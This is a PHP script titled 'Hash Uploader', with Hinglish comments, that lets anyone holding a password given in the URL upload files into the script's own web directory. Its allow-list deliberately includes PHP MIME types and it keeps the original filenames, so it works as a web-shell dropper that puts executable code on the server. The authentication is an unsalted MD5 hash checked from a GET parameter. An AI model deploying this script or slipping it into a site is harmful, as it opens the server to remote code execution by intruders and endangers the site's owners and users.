<?php
session_start();

/* ===== CONFIG ===== */
$PASSWORD_HASH = "13631f1178a08863c6df2282efa79d6e";  

$UPLOAD_DIR = __DIR__ . "/";   // ← Present directory mein upload

$ALLOWED = [
    'image/jpeg', 'image/png', 'text/plain', 
    'text/x-php', 'application/x-php', 'application/php'
];

/* ===== AUTH CHECK ===== */
if (isset($_GET['p'])) {
    $input_hash = md5($_GET['p']);
    if (hash_equals($PASSWORD_HASH, $input_hash)) {
        $_SESSION['auth'] = true;
    } else {
        die("Wrong password");
    }
}

/* ===== LOGOUT ===== */
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: uploader.php");
    exit;
}

/* ===== UPLOAD ===== */
if (isset($_SESSION['auth']) && isset($_FILES['file'])) {
    if ($_FILES['file']['error'] === UPLOAD_ERR_OK) {
        
        $tmp = $_FILES['file']['tmp_name'];
        $mime = mime_content_type($tmp);

        if (!in_array($mime, $ALLOWED)) {
            die("Invalid file type: " . htmlspecialchars($mime));
        }

        $original_name = basename($_FILES['file']['name']);   // Original name rakhega

        $destination = $UPLOAD_DIR . $original_name;

        // Agar same naam ki file pehle se hai toh overwrite ho jayegi
        if (move_uploaded_file($tmp, $destination)) {
            echo "✅ File successfully uploaded!<br><br>";
            echo "File Name: <b>" . htmlspecialchars($original_name) . "</b><br>";
            echo "Location: Current Directory<br><br>";
            echo "<a href='uploader.php'>← Back to Uploader</a>";
        } else {
            echo "❌ File upload failed. Check folder permissions.";
        }
        exit;
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Hash Uploader</title>
</head>
<body>

<h2>File Uploader (Current Directory)</h2>

<?php if (empty($_SESSION['auth'])): ?>

<p>Login via URL: <code>?creds</code></p>

<?php else: ?>

<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file" required>
    <button type="submit">Upload</button>
</form>

<br>
<a href="?logout=1">Logout</a>

<?php endif; ?>

</body>
</html>
